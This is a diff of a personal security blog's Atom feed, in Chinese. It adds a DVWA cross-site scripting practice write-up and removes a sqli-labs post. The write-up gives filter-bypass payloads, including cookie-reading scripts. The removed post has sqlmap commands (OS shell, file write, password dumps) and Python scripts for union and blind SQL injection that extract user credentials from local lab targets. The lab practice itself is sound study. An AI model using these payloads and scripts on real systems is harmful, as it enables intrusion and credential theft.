@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://z0ekball.github.io</id>
     <title>z0ekball</title>
-    <updated>2022-04-14T17:37:15.403Z</updated>
+    <updated>2022-04-14T17:49:20.264Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://z0ekball.github.io"/>
     <link rel="self" href="https://z0ekball.github.io/atom.xml"/>
@@ -10,6 +10,64 @@
     <logo>https://z0ekball.github.io/images/avatar.png</logo>
     <icon>https://z0ekball.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, z0ekball</rights>
+    <entry>
+        <title type="html"><![CDATA[DVWA练习(XSS)]]></title>
+        <id>https://z0ekball.github.io/post/dvwaxss/</id>
+        <link href="https://z0ekball.github.io/post/dvwaxss/">
+        </link>
+        <updated>2021-11-15T15:44:13.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="xssreflected-low">XSS(Reflected)-Low</h2>
+<p>查看源码，对name参数没有任何过滤和检查<br>
+​                         <img src="https://z0ekball.github.io/post-images/image-20220415014029290.png" alt="image-20220415014029290" loading="lazy"></p>
+<p>输入一段JavaScript代码：<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，返回一个弹窗，攻击成功</p>
+<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415014034811.png" alt="image-20220415014034811" loading="lazy"></figure>
+<p>获取cookie:<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415014038390.png" alt="image-20220415014038390" loading="lazy"></figure>
+<h2 id="xssreflected-medium">XSS(Reflected)- Medium</h2>
+<p>查看源码，发现存在对script的简单过滤，匹配<code>&lt;script&gt;</code>换成null，只执行一次</p>
+<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415014047015.png" alt="image-20220415014047015" loading="lazy"></figure>
+<p>采用双写绕过，输入<code>&lt;scr&lt;script&gt;ipt&gt;alert('xss')&lt;/script&gt;</code></p>
+<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415014050608.png" alt="image-20220415014050608" loading="lazy"></figure>
+<h2 id="xssreflected-high">XSS(Reflected)-High</h2>
+<p>查看源码，采用正则表达式过滤，故无法使用大小写绕过和双写绕过</p>
+<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415014058357.png" alt="image-20220415014058357" loading="lazy"></figure>
+<p>换一种标签，输入：<code>&lt;img src=&quot;&quot; onerror=&quot;alert('xss')&quot;&gt;</code>，攻击成功</p>
+<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415014101999.png" alt="image-20220415014101999" loading="lazy"></figure>
+<h2 id="xssstored-low">XSS(Stored)-Low</h2>
+<p>输入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，有弹窗</p>
+<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415014119504.png" alt="image-20220415014107878" loading="lazy"></figure>
+<p>输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code>，设计一个按钮打开弹窗</p>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415014125565.png" alt="image-20220415014125565" loading="lazy"></figure>
+<p>输入<code>&lt;a href=http://www.bilibili.com&gt;click&lt;/a&gt;</code>，按下按钮打开bilibili网页</p>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415014129626.png" alt="image-20220415014129626" loading="lazy"></figure>
+<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，返回页面cookie</p>
+<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415014136222.png" alt="image-20220415014136222" loading="lazy"></figure>
+<h2 id="xssstored-medium">XSS(Stored)-Medium</h2>
+<p>查看源码，message参数把需要转义的字符进行转义防止了xss攻击</p>
+<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415014216650.png" alt="image-20220415014216650" loading="lazy"></figure>
+<p>转义结果</p>
+<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415014144308.png" alt="image-20220415014144308" loading="lazy"></figure>
+<p>name参数对<code>&lt;script&gt;</code>有简单过滤，替换第一个<code>&lt;script&gt;</code>，且限制输入10个字符</p>
+<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415014226987.png" alt="image-20220415014226987" loading="lazy"></figure>
+<p>抓包，进行简单绕过</p>
+<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415014233230.png" alt="image-20220415014233230" loading="lazy"></figure>
+<p>编码成url</p>
+<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415014238817.png" alt="image-20220415014238817" loading="lazy"></figure>
+<p>成功执行</p>
+<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415014242586.png" alt="image-20220415014242586" loading="lazy"></figure>
+<p>获取cookie</p>
+<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415014249018.png" alt="image-20220415014249018" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415014317151.png" alt="image-20220415014258608" loading="lazy"></figure>
+<h2 id="xssstored-high">XSS(Stored)-High</h2>
+<p>查看源码，在medium的基础上对script进行严格过滤</p>
+<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415014343501.png" alt="image-20220415014343501" loading="lazy"></figure>
+<p>不使用script即可，输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code></p>
+<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415014350676.png" alt="image-20220415014350676" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415014357200.png" alt="image-20220415014357200" loading="lazy"></figure>
+<p>攻击成功</p>
+<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415014402390.png" alt="image-20220415014402390" loading="lazy"></figure>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[DVWA练习(SQL Injection)]]></title>
         <id>https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/</id>
@@ -950,231 +1008,6 @@ print(t)
 </code></pre>
 <h3 id="结果整不出来应该是版本问题暂时未解决">结果：整不出来，应该是版本问题，暂时未解决</h3>
 <figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/1624308452186.png" alt="" loading="lazy"></figure>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[sqli-labs(1~10)脚本、sqlmap学习]]></title>
-        <id>https://z0ekball.github.io/post/sqli-jiao-ben/</id>
-        <link href="https://z0ekball.github.io/post/sqli-jiao-ben/">
-        </link>
-        <updated>2021-06-15T07:11:55.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="一些准备">一些准备</h2>
-<ol>
-<li>安装sqlmap</li>
-<li>命令行pip install requests 检查时候安装request或者需要更新，否则无法使用；</li>
-<li>加引号快捷键用不，用正则表达式进行替换</li>
-</ol>
-<pre><code>(.*?):(.*)
-'$1':'$2'，
-</code></pre>
-<h1 id="sqlmap基础知识">sqlmap基础知识</h1>
-<ol>
-<li>sqlmap常见步骤：</li>
-</ol>
-<pre><code>sqlmap -u url --dbs #获取数据库
-sqlmap -u url --current-user #获取当前用户名称 ：
-sqlmap -u url --current-db #获取当前数据库名称
-sqlmap -u url -D 数据库名 --tables   #列出表名 ： 
-sqlmap -u url -D 数据库名 -T 表名 --columns #列出字段 
-sqlmap -u url -D 数据库名 -T 表名 -C 字段名1,字段名2,…… --dump #获取字段内容
-</code></pre>
-<ol start="2">
-<li>常见参数</li>
-</ol>
-<pre><code>--cookie=cookie的内容        设置cookie 值 通常配合获取数据库使用 
---data        设置 POST 提交的值
--u        指定目标 URL
--b        获取 DBMS banner
---current-db        获取当前数据库
---current-user        获取当前数据库的用户
---tables        获取数据库里所有的表名
---columns        获取表里的所有字段
---dump        获取字段中的内容
---current-user        获取当前用户
--D [数据库名]       指定数据库名
--T  [表名]      指定表名
--C  [字段名]      指定字段名
---string       当查询可用时用来匹配页面中的字符串
---users        枚举所有用户
---passwords      枚举所有用户的密码hsah
---dbs      枚举数据库中的数据库名
--r       指定请求包
-
-GET型注入一般用 sqlmap -u url
-POST型注入一般用 sqlmap -u url --data POST参数
-</code></pre>
-<ol start="3">
-<li>常见命令</li>
-</ol>
-<pre><code>--sql-query=&quot; &quot;  执行查询语句
---level 5  探测等级(1~5 默认为1，等级越高Payload越多，速度也比较慢)
---is-dba   判断当前用户是否是管理员权限
---roles    列出数据库管理员角色(仅适用与Oracle数据库)
---referer  HTTP Referer头(伪造HTTP头中的Referer，当--level等级大于等于3时会通过伪造Referer来进行注入)
---sql-shell 运行自定义SQL语句 用法：sqlmap -u url --sql-shell
---os-cmd，--os-shell 运行任意操作系统命令(仅支持MySQL、PostgreSQL、SQL Server)
---file-read 从数据库服务器中读取文件(要知道文件绝对路径)
---file-write &quot;本地文件路径&quot; --file-dest &quot;远程绝对路径&quot;   上传文件到数据库服务器中
-</code></pre>
-<h1 id="less-1普普通通的get">less-1(普普通通的get)</h1>
-<h3 id="脚本获取用户和密码">脚本：获取用户和密码</h3>
-<pre><code class="language-python">import urllib.parse #解析url
-import http.client #实现了所有 HTTP 的方法（GET、POST、PUT、HEAD、DELETE、HEAD、OPTIONS 等）
-                   #支持 HTTPS 协议
-                   #支持代理服务器（Nginx等）等
-                   #支持自动（跳转）转向
-
-url = &quot;127.0.0.1&quot;
-#body必须url编码,可用urllib.parse.quote()转,或者浏览器上转
-body=&quot;/sqli/Less-1/?id=-1%27%20union%20select%201,2,group_concat(concat_ws(%27~%27,username,password))from%20security.users--+&quot;
-c = http.client.HTTPConnection(url) #确定对象
-c.request(&quot;GET&quot;, body) #确定方式 
-r = c.getresponse()
-print(r.status, r.reason) #状态字，状态原因
-data = r.read()
-print(data)
-</code></pre>
-<h3 id="结果">结果</h3>
-<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624212566178.png" alt="" loading="lazy"></figure>
-<h1 id="less-2">less-2</h1>
-<p>id=-1--+，其他都一样</p>
-<h1 id="less-3">less-3</h1>
-<p>id=-1')--+,其他都一样</p>
-<h1 id="less-4">less-4</h1>
-<p>id=-1&quot;)--+,其他都一样</p>
-<h1 id="less-5get盲注">less-5(get盲注)</h1>
-<h3 id="知识点补充">知识点补充：</h3>
-<pre><code>%s 在python中用法：
-1. %10s代表输出宽度为10个字符，如果输出的字符串不超过10，则在左边补空格；宽度超过10，按原长度输出
-2. %-10s表示如果输出的字符串宽度不超过10，则在右边补齐空格；宽度超过10，按原长度输出
-3. %.10s表示截取前10个字符，若原长度不够10，则原样输出
-4. %s 作为待定字符，在后%（i,j）可进行替换，达到爆破效果
-</code></pre>
-<h3 id="脚本爆破数据库名称">脚本：爆破数据库名称</h3>
-<pre><code class="language-python">import urllib.parse
-import http.client
-
-#爆破字典
-d = list('abcdefghijklmnopqrstuvwxyz')
-name = ''
-url = &quot;127.0.0.1&quot;
-
-#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
-for i in range(1,20):
-	for j in d:
-		c = http.client.HTTPConnection(url)
-
-        # 一个大坑：必须是url编码，除了%s外都是%%前缀，否则会报错
-		body = &quot;/sqli/Less-5/?id=1%%27%%20and%%20mid(database(),%s,1)=%%27%s%%27--+&quot; % (i,j)
-		print(body)
-		c.request(&quot;GET&quot;, body) #确定方式
-		r = c.getresponse() #提取响应包
-		data = r.read()
-		c.close()
-		#确认正确的一项，拼接
-		if data.find(b'You are in') &gt;0: 
-			name += j
-			print(j)
-			break
-		else:
-			print(&quot;no&quot;)
-print(name)
-</code></pre>
-<h3 id="结果-2">结果</h3>
-<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624215382215.png" alt="" loading="lazy"></figure>
-<h1 id="less-6sqlmap脚本">less-6（sqlmap+脚本）</h1>
-<p>（emmmmm,不得不说第一次使用sqlmap,怀疑自己之前爆破个库名都死去活来，是不是傻= =）</p>
-<h3 id="查看库名">查看库名</h3>
-<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --dbs 
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624216731977.png" alt="" loading="lazy"></figure>
-<h3 id="查看表名">查看表名</h3>
-<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --tables
-</code></pre>
-<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624216883317.png" alt="" loading="lazy"></figure>
-<h3 id="查看列名">查看列名</h3>
-<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --columns
-</code></pre>
-<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624217172590.png" alt="" loading="lazy"></figure>
-<h3 id="查看用户密码">查看用户密码</h3>
-<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;password&quot; --dump
-</code></pre>
-<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624218772000.png" alt="" loading="lazy"></figure>
-<h3 id="脚本查询id2的用户密码">脚本：查询id=2的用户密码</h3>
-<pre><code class="language-python"># 复制粘贴修改body
-import urllib.parse
-import http.client
-
-#爆破字典
-d = list('abcdefghijklmnopqrstuvwxyz123456789-_')
-name = ''
-url = &quot;127.0.0.1&quot;
-
-#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
-for i in range(1,15):
-	for j in d:
-		c = http.client.HTTPConnection(url)
-		body = &quot;/sqli/Less-6/?id=1%%22%%20and%%20mid((select%%20password%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27%%20--+&quot; % (i,j)
-		print(body)
-		c.request(&quot;GET&quot;, body) #确定方式
-		r = c.getresponse() #提取响应包
-		data = r.read()
-		c.close()
-		#确认正确的一项，拼接
-		if data.find(b'You are in') &gt;0: 
-			name += j
-			print(j)
-			break
-		else:
-			print(&quot;no&quot;)
-print(name)
-</code></pre>
-<h3 id="结果-3">结果</h3>
-<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624223954426.png" alt="" loading="lazy"></figure>
-<h1 id="less-7">less-7</h1>
-<p>id=1'))--+,布尔盲注，脚本基本一样<br>
-练习一下sqlmap</p>
-<h3 id="查询开头为a的用户和密码">查询开头为a的用户和密码</h3>
-<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-7/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --sql-query=&quot;select username,password from users where username like 'a%'&quot;;
-</code></pre>
-<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624275315411.png" alt="" loading="lazy"></figure>
-<h1 id="less-8">less-8</h1>
-<p>id=1'--+,其他一样</p>
-<h1 id="less-9时间盲注">less-9(时间盲注)</h1>
-<h3 id="脚本id2的用户名要多运行一两次排除因为网速出现的延迟">脚本：id=2的用户名，要多运行一两次，排除因为网速出现的延迟</h3>
-<pre><code class="language-python">import time
-import urllib.parse
-import http.client
-
-#爆破字典
-d = list('abcdefghijklmnopqrstuvwxyz')
-name = ''
-url = &quot;127.0.0.1&quot;
-
-#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
-for i in range(1,15):
-    for j in d:
-        time1=time.time() #开始时间
-        c=http.client.HTTPConnection(url)
-        body=&quot;/sqli/Less-9/?id=1%%27%%20and%%20if(mid((select%%20username%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27,sleep(1),0)--+&quot;%(i,j)
-        print(body)
-        c.request(&quot;GET&quot;, body) #确定方式
-        r = c.getresponse() #提取响应包
-        time2=time.time() #结束时间
-        data = r.read()
-        c.close()
-        #确认正确的一项，拼接
-        if time2-time1 &gt;1:
-            name += j
-            print(j)
-            break
-		
-print(name)
-</code></pre>
-<h3 id="结果-4">结果</h3>
-<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624287255225.png" alt="" loading="lazy"></figure>
-<h1 id="less-10">less-10</h1>
-<p>id=1&quot;--+,其他和9一样</p>
 ]]></content>
     </entry>
 </feed>
